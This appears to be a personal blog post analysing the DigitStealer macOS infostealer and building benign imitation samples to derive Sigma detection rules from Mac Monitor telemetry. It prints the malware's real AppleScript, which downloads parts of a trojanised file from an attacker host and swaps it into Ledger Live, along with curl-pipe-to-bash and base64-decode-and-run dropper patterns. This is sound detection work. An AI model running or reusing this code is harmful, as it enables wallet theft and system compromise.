---
title: DigitStealer - Using Atomic Indicators and MacMonitor to Suck Less
categories: 
  - MacOS
  - Malware
  - InfoStealer
tags:
  - blog
  - macos
  - malware
  - analysis
  - stealer
  - digitstealer
  - atomic indicators
  - sigma rules
  - tooling
  - mac monitor
date: 2025-11-22
description: Developing better sigma rules and detectors by using Atomic style indicators and MacMonitor. 
author: izzyboop
image:
    path: /assets/img/digitstealer/cover.png
    visible: false
---

## Introduction

So why am I writing this blog? Because I want to, you're not my real dad, I do what I want.

![image](/assets/img/digitstealer/profanity.webp){: .w-50 .shadow .rounded-10 }

I apologize for my outburst. As with all my other blogs, this was written for myself as an outlet to learn more about a specific subject. There may very well be better ways to do everything I do in this blog, and that's okay. Suckin at something is the first step toward bein sorta good at something.

On November 13 2025 [Thijs Xhaflaire](https://www.linkedin.com/in/thijs-xhaflaire-290b63a5/?originalSubdomain=nl) of Jamf Threat Labs dropped a [super awesome blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/) about a new JXA-based macOS infostealer, DigitStealer. This blog provides an incredibly informative write up of the key behaviours exhibited by this flavour of macOS stealer, and highlights some of the specifics that differ from previous stealers. (Finally, one that's not AMOS.)

While reading this blog, I asked myself a series of questions. Namely:
1. Do my current detectors fire on any of this activity?
2. If they do, can my detector logic be improved?
3. What is the best way to create sigma rules for this observed activity with my limited tooling? (I'll expand on this.)
    - A/N: While writing this blog, Nebulock dropped their blog on [coreSigma](https://nebulock.io/blog/coresigma-expanding-sigma-detection-for-macos), an effort to expand the macOS sigma compatibility by building up a macos ESF pipeline. Keep an eye out on that because I'll surely be utilizing it in the future.

We will be focusing on question three for the duration of this blog.

## The Problem (and My Solution)

My first problem is that my malware analysis pipeline is a bit under the weather at the moment so I was not confident interfacing with live samples.  This caused me to have to use the information provided in the Jamf blog as well as in a few other public sources. (I'm working on getting it spun back up, leave me alone.)

My second problem was that the actual telemetry I would need to detect against would be different than the source code provided in these blogs. I needed a way to see the resulting host telemetry without executing a (malicious) live sample. 

My third problem was that I do not currently have a SIEM or any log ingestion tooling. I have some new hardware on the way to spin up ~~Splunk~~ Elastic in my homelab but at the moment my lab consists of some network hardware and a raspberry pi and the little guy was simply not up to the task of running Elastic or Splunk. 

This was while idle: 

![image](/assets/img/digitstealer/pipain.png){: .w-75 .shadow .rounded-10 }
_He was trying his best_

>A/N: This was true at the time of this analysis. In the middle of writing this blog I have since spun up an ELK stack bacause Splunk's macOS ingestion made me very sad. Further blogs will utilize ELK. 

With all of these limitations, I still had a task to complete. So how did I get it done? I created some fake malware samples meant to mimic the observed digitstealer activity that ultimately just prints some `hello world`'s and creates some files on disk. I ran my fake malware while using one of my favourite tools, [MacMonitor](https://github.com/Brandon7CC/mac-monitor) (thanks [Brandon Dalton](https://github.com/Brandon7CC)), to see the resulting host telemetry to create my sigma rules, then used [sigma-esf](https://github.com/bradleyjkemp/sigma-esf) to test these sigma rules against my benign samples. (This last part is the bit I will be replacing with ELK and coreSigma down the line.)

## The Observed Activity
### The Dropper

I didn't recreate every part of this malware. Instead I focused on a few key points I felt were good detection opportunities. 

1. Stage one: The initial dropper
    - The initial `.msi` labeled text file containing the initial `curl`
    - The resulting `base64` encoded payload getting piped to `base64 -d`, `gunzip`, and `bash`
    - The four `curl` commands used to pull down further payloads
2. Payload one: The plain text `AppleScript`
    - This applescript pulls down three separate pieces of an `app.asar` file then concatenates them to modify Ledger Live.

All other payloads came after this activity so I only found it necessary to mimic these first two sections (for now). I will be revisiting this with a live sample when I get Splunk spun up.

Let's take a look at the dropper. It starts off with a `.pkg` file that, when executed, presents the user with a `Drag Into Terminal.msi` file and instructs them to drag it into `Terminal`.

![image](/assets/img/digitstealer/thepkg.png){: .w-50 .shadow .rounded-10 }

This `.msi` file is actually just a text file with the `.msi` extension. The contents of this file are as follows:

{% raw %}
```bash
curl -fsSL [malicious URL] | bash
```
{: .nolineno }
{% endraw %}

> If you want the URLs, go check out the [Jamf blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/). No seriously, go do that.
{: .prompt-tip }

When this file is dragged onto `Terminal` it executes the contents which uses `curl` to reach out to a malicious URL, then pipes the resulting payload to `bash`.

The payload it retrieves and pipes into `bash` looks like the following:

{% raw %}
```bash
echo '[malicious base64 encoded payload]' | base64 -d | gunzip | bash
```
{: .nolineno }
{% endraw %}

This commandline takes the `base64` encoded payload, decodes it using `base64 -d` which reveals some compressed `gzip` data, pipes that to `gunzip` to uncompress it, then pipes the resulting payload to `bash`. 

The resulting payload was a `bash` script that did a bunch of hardware checking using `system_profiler` and `sysctl` then had four `curl` statements to pull down further malicious payloads:

{% raw %}
```bash
nohup curl -fsSL [malicious URL] | osascript >/dev/null 2>&1 &
sleep 1

nohup curl -fsSL [malicious URL] | osascript -l JavaScript >/dev/null 2>&1 &
sleep 1

nohup curl -fsSL [malicious URL] | osascript -l JavaScript >/dev/null 2>&1 &
sleep 1

nohup curl -fsSL [malicious URL] | bash >/dev/null 2>&1 &
```
{: .nolineno }
{% endraw %}

---
### Mimicking the Dropper

>If you would like to follow along, all these files are present on my [github](https://github.com/IzzyBoop/FakeMalwareStaging/tree/main/DigitStealer%20Simulation).
{: .prompt-info :}

There were a few burning questions I needed to answer which would motivate which parts of this activity I would mimic. First, I wanted to know if dragging the `.msi` file into terminal would count as an interactive commandline session, and whether or not that means I would not see the initial `curl` at all in the resulting telemetry. Next, if I did see it in the telem, does it retain the whole command or does it split the commands up at the pipes?

For example, when a command is run on a macOS host that utilizes pipes like this: `cat [some file] | grep -iE 'some pattern' | sort | uniq`, you usually do not get that whole commandline as a single log event, you get four separate PIDs for `cat [some file]`, `grep -iE 'some pattern'`, `sort`, and `uniq`. The saving grace is they will all have the same group ID. Sometimes shown as `GID` or `PGID`. 

>You can find more information about macOS's weird PIDs and process forks in my other blog post [Basic macOS Malware Analysis](https://izzyboop.com/posts/MacOS-Static-Malware-Analysis-Techniques/).
{: .prompt-info :}

Further, when a commandline is executed resulting from a previous payload being piped to `bash`, is `bash` the parent process? Much in that same vein, when the commandline has several pieces that get split apart like in my above example, do they all have the same parent process, or are they a chained parent/child relationship? These are questions I was fairly sure I knew the answer to, but wanted to see it for myself. 

Let's start mimicking this activity. The best way to do that which made the most sense to me was to work backwards. Starting from the back I took one of the `nohup curl` commands and made it point to some benign applescript (`helloworld.applescript`) on my github which we will review in the next section...

{% raw %}
```bash
#!/bin/bash

nohup curl -fsSL https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/helloworld.applescript 
| osascript >/dev/null 2>&1 &
sleep 1
```
{: .nolineno }
{% endraw %}

...then used [CyberChef](https://gchq.github.io/CyberChef/) to `gzip` it then `base64` encode it:

![image](/assets/img/digitstealer/b64payload.png){: .shadow .rounded-10 }

I then wrapped this with `echo`, `base64 -d`, `gunzip`, and `bash` and pushed it to my github as `dropper.sh`. This will be the file pulled down by my version of `Drag Into Terminal.msi`.

{% raw %}
```bash
echo 
'H4sIANRhHmkA/03NsW6EMAyA4Z2n8KkSW7HoeANDh0ontRNPYIIhUU0cxUlR0T08DB26/fqW/+WGU4g4kfmmieprAlezwOti4yf4UpLdETPt3RqKr1M1zk5j4Vg6pxs+juP3XTXhB33zF8lOmcdCa4grZl4MPdNsuNE1oZSEzeWQysUiumuWufvH8AQ1+usBZ/7BWEXgbWh7aBsT5gT9CRdRMle0AAAA' 
| base64 -d | gunzip | bash
```
{: file="dropper.sh" .nolineno }
{% endraw %}

This will hopefully allow me to see how these processes behave when loaded into memory and how that manifests in the telemetry. Will I see the base64? Will I see the decoded version? Will the commands be retained in their entirety or split apart? This is what I intend to find out.

Speaking of `Drag Into Terminal.msi`, we can now mimic that file too. As mentioned above, this file is just a text file with the `.msi` extension. The actual contents of the file were just a `curl` command with the `-fsSL` flags and piped to `bash`. I created the following file to download the `dropper.sh` file we just created and pushed it to my github as `Drag Into Terminal.msi`:

{% raw %}
```bash
curl -fsSL 'https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/bash/dropper.sh' 
| bash
```
{: file="Drag Into Terminal.msi" .nolineno }
{% endraw %}

The execution chain at this point in time is as follows:

1. `Drag Into Terminal.msi` dragged into terminal
    - `curl` pulls down `dropper.sh` into memory and pipes it into `bash`
2. `dropper.sh`, from memory, pipes a base64 and gzip'd payload into `base64 -d`, `gunzip`, then into `bash`
3. `curl` pulls down applescript and pipes it into `osascript` for execution

So far, so good. Let's move on to the AppleScript payload. 

---

### The AppleScript

This is the payload that pulls down three separate files then concatenates them into `app.asar`, which is used to replace a file within a legitimate Ledger Live crypto wallet install on a target host. 

The AppleScript used in DigitStealer:

{% raw %}
```applescript
set kDomainPrefix to "67e5143a9ca7d2240c137ef80f2641d6"
set kDomainSuffix to "pages.dev"
set kTotalParts to 3
set kPartBaseName to "app.asar.zip.part"
set kPartExtension to ".aspx"

set kDownloadFolder to "/tmp/downloaded_parts"
set kMergedZip to "/tmp/app.asar.zip"
set kSourcePath to "/tmp/app.asar"
set kDestPath to "/Applications/Ledger Live.app/Contents/Resources/"

set kDomain to kDomainPrefix & "." & kDomainSuffix

do shell script "osascript -e 'set volume with output muted'"

do shell script "mkdir -p " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

repeat with i from 1 to kTotalParts
    set partUrl to "https://" & kDomain & "/" & kPartBaseName & i & kPartExtension
    set partFile to kDownloadFolder & "/part" & i & kPartExtension

    do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of partFile & " " & quoted form of partUrl
    do shell script "cat " & quoted form of partFile & " >> " & quoted form of kMergedZip
end repeat

do shell script "cd /tmp && unzip -o " & quoted form of kMergedZip
do shell script "killall 'Ledger Live' || true"

tell application "Finder"
    set sourceAlias to POSIX file kSourcePath as alias
    set destAlias to POSIX file kDestPath as alias
    duplicate sourceAlias to destAlias with replacing
end tell

do shell script "rm -rf " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

do shell script "osascript -e 'set volume without output muted'"
```
{: file="AppleScript" .nolineno }
{% endraw %}

Let's break this down a bit. 

In this first section we have our initial variable declarations. The last variable in the list, `kDomain` is a concatenation of `kDomainPrefix` (`67e5143a9ca7d2240c137ef80f2641d6`), a period, and `kDomainSuffix` (`pages.dev`) to create `67e5143a9ca7d2240c137ef80f2641d6.pages[.]dev`, our primary remote payload host in this stage of the execution.

Other variables here are used to determine paths used by the AppleScript, or the naming convention of files.

{% raw %}
```applescript
set kDomainPrefix to "67e5143a9ca7d2240c137ef80f2641d6"
set kDomainSuffix to "pages.dev"
set kTotalParts to 3
set kPartBaseName to "app.asar.zip.part"
set kPartExtension to ".aspx"

set kDownloadFolder to "/tmp/downloaded_parts"
set kMergedZip to "/tmp/app.asar.zip"
set kSourcePath to "/tmp/app.asar"
set kDestPath to "/Applications/Ledger Live.app/Contents/Resources/"

set kDomain to kDomainPrefix & "." & kDomainSuffix
```
{: file="AppleScript" .nolineno }
{% endraw %}

This next section starts off by setting the host's volume to mute. My assumption is that this is simply to avoid any system sounds that may be triggered by the following activity. Next we create our download folder and make sure we don't already have a `.zip` in place named `/tmp/app.asar.zip` by running a preliminary `rm -rf`. This is generally good practice for any payloads you may want to run more than once.

Next we have the AppleScript version of a `for` loop. `repeat with i from 1 to kTotalParts` simply means repeat the following code 3 times and iterate the `i` variable from 1 to 3 as each loop runs. We start by setting the URL for part 1 (note the `i` in the concatenated file path), then we set the name of the output file. then run curl to download the file from the URL we just created. Then we use `cat` to read out and append the data directly to the `kMergedZip` file. It then repeats this for parts 2 and 3. Once all 3 parts are appended, this will be a valid `.zip` file.

{% raw %}
```applescript
do shell script "osascript -e 'set volume with output muted'"

do shell script "mkdir -p " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

repeat with i from 1 to kTotalParts
    set partUrl to "https://" & kDomain & "/" & kPartBaseName & i & kPartExtension
    set partFile to kDownloadFolder & "/part" & i & kPartExtension

    do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of partFile & " " & quoted form of partUrl
    do shell script "cat " & quoted form of partFile & " >> " & quoted form of kMergedZip
end repeat
```
{: file="AppleScript" .nolineno }
{% endraw %}

The final few lines of the Apple Script start off by unzipping the newly created zip file into `/tmp` then killing any currently running Ledger Live processes. Once killed, it tells Finder to take the `/tmp/app.asar` file that was just unzipped and copy it into `/Applications/Ledger Live.app/Contents/Resources/`. Since `with replacing` is set, it tells Finder to replace the original file in the destination with the new one. 

The apple script then deletes the initial download folder and the zip, then unmutes the volume. 

{% raw %}
```applescript
do shell script "cd /tmp && unzip -o " & quoted form of kMergedZip
do shell script "killall 'Ledger Live' || true"

tell application "Finder"
    set sourceAlias to POSIX file kSourcePath as alias
    set destAlias to POSIX file kDestPath as alias
    duplicate sourceAlias to destAlias with replacing
end tell

do shell script "rm -rf " & quoted form of kDownloadFolder
do shell script "rm -f " & quoted form of kMergedZip

do shell script "osascript -e 'set volume without output muted'"
```
{: file="AppleScript" .nolineno }
{% endraw %}
---

### Mimicking the AppleScript

My primary goal in regard to mimicking the apple script was to see how certain lines manifested in process telemetry, so I chose certain lines that had questions I wanted answered while ignoring others I was confident about.

Let's take a look at my much smaller version and talk through it.

{% raw %}
```applescript
set kPrint to "applescript hello world"
set kURL to "https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/final.applescript"
set kDownloadFolder to "/tmp/FAKEMALWARE"
set kFile to "/tmp/FAKEMALWARE/final.applescript"
set kFile2 to "/tmp/FAKEMALWARE/final2.applescript"

-- This is a comment

do shell script "echo " & quoted form of kPrint

do shell script "mkdir -p " & quoted form of kDownloadFolder

do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of kFile & " " & quoted form of kURL

do shell script "cat " & quoted form of kFile & " >> " & quoted form of kFile2
```
{: file="helloworld.applescript" .nolineno }
{% endraw %}

The first thing I wanted to know was how `& quoted form of [variable]` showed up in the telemetry as well as `do shell script` so I created a variable `kPrint` and loaded it with a hello world string then called the whole thing with `do shell script "echo " & quoted form of kPrint`. The next thing I wanted to know was whether or not command flags like `-p` persisted in the telemetry so I retained the original `do shell script "mkdir -p " & quoted form of kDownloadFolder` but just changed the path string. From here I really wanted to know how the curl command with the 7 jillion flags, a file path, and a URL would show up, so I retained that exactly as is and just changed the file path and pointed the URL to yet another benign AppleScript file on my github. The final thing I was curious about was whether or not the `cat` command retained the `>>` redirect characters in the resulting telemetry so I kept that exactly as is but changed the variables to point to my own files.

This file was saved as `helloworld.applescript` on my github and the `final.applescript` reference in this script is simply a hello world:

{% raw %}
```applescript
set kFinal to "final hello world"

do shell script "echo " & quoted form of kFinal
```
{: file="final.applescript" .nolineno }
{% endraw %}

Now that I have all the pieces in place, I'm ready to run it with `MacMonitor` listening. 

---

## Running the "Malware"

>Mac Monitor can be downloaded from [here.](https://github.com/Brandon7CC/mac-monitor)
{: .prompt-info :}

Our first step is to download and launch Mac Monitor.

![image](/assets/img/digitstealer/macmonitor.png)

This tool works very similarly to `Process Monitor` on Windows. Let's illustrate.

Before we execute the malware we will click `start` to begin listening for events then take our `DragToTerminal.msi` and, well, drag it into the terminal and hit `enter` (or return for you purists). Then once we are confident the malware is finished running, which should only take a moment, we can select `stop` on Mac Monitor. This will collect only the events related to and closely surrounding our malware execution. 

![image](/assets/img/digitstealer/dragondrop.png){: .shadow .rounded-10 }

After stopping Mac Monitor, we see that we are met with several events to analyze. This is the fun part! Below we see all the log entries related to the fake malware execution that were collected, starting at the bottom with the execution of `DragToTerminal.msi` and ending at the top with `cat /tmp/FAKEMALWARE/final.applescript`. (Click the images too zoom in.)

![image](/assets/img/digitstealer/initial2zoom.png){: .shadow .rounded-10 }
![image](/assets/img/digitstealer/initial1zoom.png){: .shadow .rounded-10 }

## Analyzing the Logs Entries

Let's break it down step by step.

Starting from the bottom, we can see the initial event where we dropped the `.msi` names text file into the terminal. 

{% raw %}
```bash
sh /Users/izzyboop/Documents/github/FakeMalwareStaging/DigitStealer Simulation/bash/DragToTerminal.msi
```
{: .nolineno }
{% endraw %}

Immediately following this we see a `curl` process fire to pull down the initial dropper. Take special note of how, so far, all URL and path entries have been stripped of their surrounding quotes, there is no escaping of spaces used, and the `| bash` at the end of the `dropper.sh` script is not present in this entry. You can see it as its own process just after this `curl` event. The `bash` process that shows up just after this curl event will have its own separate `PID` but will share a process group ID (sometimes shown as `PGID`) with the initial curl event. Allowing us to properly link them back to each other as a string of piped commands.

{% raw %}
```bash
curl -fsSL https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/DigitStealer%20Simulation/bash/dropper.sh
```
{: .nolineno }
{% endraw %}

>Just to reiterate a call out from above, you can find more information about macOS's weird PIDs and process forks in my other blog post [Basic macOS Malware Analysis](https://izzyboop.com/posts/MacOS-Static-Malware-Analysis-Techniques/).
{: .prompt-info :}

So now that we can see `curl` pulling down the `dropper.sh` and we can see the implication of it being piped to bash, we should quickly refresh ourselves on what the dropper did so we can properly conceptualize the next part.

The dropper itself ran the following: 

{% raw %}
```bash
echo 
'H4sIANRhHmkA/03NsW6EMAyA4Z2n8KkSW7HoeANDh0ontRNPYIIhUU0cxUlR0T08DB26/fqW/+WGU4g4kfmmieprAlezwOti4yf4UpLdETPt3RqKr1M1zk5j4Vg6pxs+juP3XTXhB33zF8lOmcdCa4grZl4MPdNsuNE1oZSEzeWQysUiumuWufvH8AQ1+usBZ/7BWEXgbWh7aBsT5gT9CRdRMle0AAAA' 
| base64 -d | gunzip | bash
```
{: file="dropper.sh" .nolineno }
{% endraw %}

If we take a look at our log entries from the above bash running, we have a few interesting things I want to call out. The six events in order from bottom to top are:

{% raw %}
```bash
sleep 1
osascript
nohup curl -fsSL https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/DigitStealer%20Simulation/applescript/helloworld.applescript
bash
gunzip
base64 -d
```
{: .nolineno }
{% endraw %}

Notice how we don't see the encoded base64 at all in the resulting log entries. We do, however, see the `base64 -d`, `gunzip`, and `bash` that the base64 was piped into, then quickly after that we see the decoded command run. 

Remember, the decoded and gunzipped command was the following:

{% raw %}
```bash
#!/bin/bash

nohup curl -fsSL https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/DigitStealer%20Simulation/applescript/helloworld.applescript 
| osascript >/dev/null 2>&1 &
sleep 1
```
{: .nolineno }
{% endraw %}

So the next 3 log entries from above are from the decoded script:

{% raw %}
```bash
sleep 1
osascript
nohup curl -fsSL https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/DigitStealer%20Simulation/applescript/helloworld.applescript
```
{: .nolineno }
{% endraw %}

We can see that `#!/bin/bash` does not show up in our log entries, nor does the `>/dev/null 2>&1 &` output redirect after the piped osascript. We do, however, see the `osascript` and `sleep 1` processes shortly after the `curl` event. As above, they will have different `PIDs` but the same `PGID` as each other. 

Another quick refresher before we look at more entries! The `helloworld.applescript` that the last curl pulled down is shown here:

{% raw %}
```applescript
set kPrint to "applescript hello world"
set kURL to "https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/final.applescript"
set kDownloadFolder to "/tmp/FAKEMALWARE"
set kFile to "/tmp/FAKEMALWARE/final.applescript"
set kFile2 to "/tmp/FAKEMALWARE/final2.applescript"

-- This is a comment

do shell script "echo " & quoted form of kPrint

do shell script "mkdir -p " & quoted form of kDownloadFolder

do shell script "curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o " & quoted form of kFile & " " & quoted form of kURL

do shell script "cat " & quoted form of kFile & " >> " & quoted form of kFile2
```
{: file="helloworld.applescript" .nolineno }
{% endraw %}

This block of AppleScript generates a lot of log entries so the next section will show all the entires with the initiating process at the beginning of the line. For example `process -> [thing it ran]`.

{% raw %}
```bash
cat    -> cat /tmp/FAKEMALWARE/final.applescript
bash   -> sh -c cat '/tmp/FAKEMALWARE/final.applescript' >> '/tmp/FAKEMALWARE/final2.applescript'
sh     -> sh -c cat '/tmp/FAKEMALWARE/final.applescript' >> '/tmp/FAKEMALWARE/final2.applescript'
curl   -> curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o /tmp/FAKEMALWARE/final.applescript https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/final.applescript
bash   -> sh -c curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o '/tmp/FAKEMALWARE/final.applescript' 'https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/final.applescript'
sh     -> sh -c curl --max-time 3600 --retry 10 --retry-delay 5 --retry-max-time 3600 -f -C - -o '/tmp/FAKEMALWARE/final.applescript' 'https://raw.githubusercontent.com/IzzyBoop/FakeMalwareStaging/refs/heads/main/applescript/final.applescript'
mkdir  -> mkdir -p /tmp/FAKEMALWARE
bash   -> sh -c mkdir -p '/tmp/FAKEMALWARE'
sh     -> sh -c mkdir -p '/tmp/FAKEMALWARE'
bash   -> sh -c echo 'applescript hello world'
sh     -> sh -c echo 'applescript hello world'
```
{: .nolineno }
{% endraw %}

M'kay, that's a lot of events. Let's take a look at them in order to see what we can learn.

The first event tells us that `do shell script` manifests as `sh -c`, this is really helpful for future detection efforts. We can also see how the process was executed by `sh` and `bash`. The next event, the `mkdir`, is the same, executed by `sh` and `bash`, but we also see a third event executed as `mkdir` without the `sh -c` and without the quotes around the path.

The `curl` event shows us a similar scenario. It is executed as `sh`, `bash`, and `curl`, and the final `curl` event is missing the `sh -c` as well as any quoting of paths or URLs.

The final event where we `cat` the apple script into another file gives us some good info as well. It is executed by `sh`, `bash`, then `cat`. The first two retain the `>>` in the command line as well as the quotes, and the final event only retains `cat /tmp/FAKEMALWARE/final.applescript`.

## Utilizing Our Findings

So how can we utilize what we've learned here today? With sigma rules of course! Below are some examples of sigma rules I have created for my own personal use based on the info I gathered while writing this blog. 

This first rule is meant to detect two different scenatios:
- `bash` executing `base64 -d` or `gunzip`
- `bash` executing `curl` with specific flags, tld's, and file paths all present within the commandline. 

The purpose of this rule is to gather a lot of events, then follow it up with programmatic analysis where any event within `selection_1` happens within extremely close temporal proximity to an event from `selection_2`. This would allow us to gather any events where we likely have a malicious `curl` being piped into or from a `base64 -d` and `gunzip`.

{% raw %}
```yaml
title: MacOS Digit Stealer - Dropper Detection
description: Detects 'Drag Into Terminal.msi' bash dropper.
id: fdfe1adc-244a-4d84-a219-86fbdb38307c
status: experimental
author: IzzyBoop
date: 2025/11/20
logsource:
  product: macos
  category: process_creation
detection:
  selection_1:
    ParentImage|endswith: '/bash'
    CommandLine: # Look for the commands with the same group id as these results. This captures "[command] | base64 -d | gunzip", etc.
      - 'base64 -d'
      - 'gunzip'
  selection_2:
    ParentImage|endswith: '/bash'
    CommandLine|contains|all:
      - 'curl'
      - '-fsSL'
      - '.pages.dev'
      - '.aspx'
  condition: selection_1 or selection_2
  ```
{: file="MacOS DigitStealer Dropper.yaml" .nolineno }
{% endraw %}

Our next rule is a bit broad but follows the same principles as the one above. It's meant to detect two different scenatios:
- `bash` executing `curl` with `-fsSL` flags.
- `bash` executing `osascript` or `osascript -l Javascript`

As above, this rule is also meant to be used to gather a large amount of initial data then be followed up with analysis to find any events that happen within an extremely short amount of time of one another. 

{% raw %}
```yaml
title: MacOS Digit Stealer Curling Further Payloads
description: Detects Digit Stealer Curling Second Stage Payloads
id: 0b9e1c49-ba9d-486a-a27e-1ce2363fb8fd
status: experimental
author: IzzyBoop
date: 2025/11/20
logsource:
  product: macos
  category: process_creation
detection:
  selection_1:
    ParentImage|endswith: 'bash' 
    CommandLine|contains|all:
      - 'curl'
      - '-fsSL'
  selection_2:
    ParentImage|endswith: 'bash'
    CommandLine: # Look for the commands with the same group id as these results. This captures "[command] | osascript", etc.
      - 'osascript'
      - 'osascript -l Javascript'
  condition: selection_1 or selection_2
```
{: file="MacOS Digit Stealer Curling Payloads.yaml" .nolineno }
{% endraw %}

## Conclusion

Look, I'll be honest with you. This whole process was messy, janky, and probably not how "real" malware analysts do it. But you know what? It worked. And more importantly, I learned a *ton* in the process.

By creating fake malware samples and using MacMonitor to see how commands actually manifest in host telemetry, I was able to answer questions I didn't even know I had. Does `& quoted form of [variable]` show up in logs? Yes and no. Do piped commands stay together or split apart? They split faster than my parents did. Do `base64` encoded payloads show up before decoding? Nah. These might seem like small details, but they're *critical* when you're trying to write detection logic that doesn't suck.

The sigma rules I created from this exercise are far from perfect. They're broad, they'll probably generate some noise, and they absolutely need to be followed up with temporal analysis to correlate related events. But that's okay! Because now I have *something* instead of nothing, and I have a better understanding of how to iterate and improve them. Plus, once I get my ELK stack fully operational and start playing with coreSigma, I can revisit all of this with better tooling and make it even better.

The real takeaway here isn't just "here's how you detect DigitStealer" (though hopefully the rules help someone out there). The real takeaway is that you don't need a fully kitted-out lab with enterprise SIEM solutions and a malware sandbox to start learning. You can use free tools like MacMonitor, create some fake samples on GitHub, and just... start poking around. Will you make mistakes? Absolutely. Will some of your detections be janky? 100%. But remember: suckin at something is the first step toward bein sorta good at something.

So go forth, create some fake malware, break some stuff, write some terrible sigma rules, and learn from it. And if you do find better ways to do any of this (which you probably will because let's be real, the bar is not high), please share them. We're all just out here trying to git gud together.

If you want to follow along with my continued journey of questionable detection engineering and macOS shenanigans, all my sigma and yara rules are on [my github](https://github.com/IzzyBoop/Sigma-and-Yara-Rules/). Feel free to use them, improve them, or laugh at them. All three are valid responses.

Now if you'll excuse me, I have an ELK stack to go configure. Wish me luck.
